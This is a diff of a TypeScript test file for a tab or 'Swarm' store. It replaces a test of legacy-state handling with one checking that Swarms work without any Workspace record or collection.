-    const own = (await store.create(solo, randomUUID(), 'Solo')).id
-    await db.superTab.update({ where: { id: own }, data: { legacyState: OLD_STATE } })
-    expect((await measured('list', () => store.list(solo))).tabs).toEqual([expect.objectContaining({ id: own, name: 'Solo', ownerId: solo.sub })])
-    expect(await measured('host grids', () => store.hostGrids(solo))).toEqual([expect.objectContaining({ tabId: own, enabled: true })])
-    expect(await measured('archive', () => store.archiveFinished(tab, group, {}))).toBe(false)
-    const requestId = (await run(tab, { type: 'agent.screen', agentId: worker, scrollback: 20 }, host, lead)).result.requestId as string
-    expect((await measured('terminal pickup', () => store.hostTerminal(host, 'test-host'))).filter(row => row.tabId === tab).map(row => row.request.id))
-      .toEqual([requestId])
-    expect(fetched).toEqual([])
-
-    // Reads and writes leave it in place: only the maintenance script removes it.
-    for (const id of [tab, own]) expect((await db.superTab.findUnique({ where: { id }, select: { legacyState: true } }))!.legacyState).toEqual(OLD_STATE)
+// Swarm v4 removed Workspaces, the level above Swarms: who may read or command a Swarm rests on its own people, machines and
+// shares, and a new Swarm names no Workspace.
+describe('a Swarm with no Workspace above it', () => {
+  it('is created, read, commanded and listed, and names none', async () => {
+    const tab = (await store.create(owner, randomUUID(), 'Plain')).id
+    await store.read(owner, tab)
+    await store.execute(owner, tab, { operationId: randomUUID(), command: { type: 'tab.rename', name: 'Plain again' } })
+    await store.list(owner)
+    expect((await db.superTab.findUniqueOrThrow({ where: { id: tab } })).workspaceId).toBeNull()
+    // Nothing wrote a Workspace collection meanwhile, by any command: none exists.
+    const collections = ((await db.$runCommandRaw({ listCollections: 1, nameOnly: true })) as { cursor: { firstBatch: Array<{ name: string }> } }).cursor.firstBatch
+    expect(collections.map(c => c.name).filter(name => /Workspace/.test(name))).toEqual([])
   })
 })
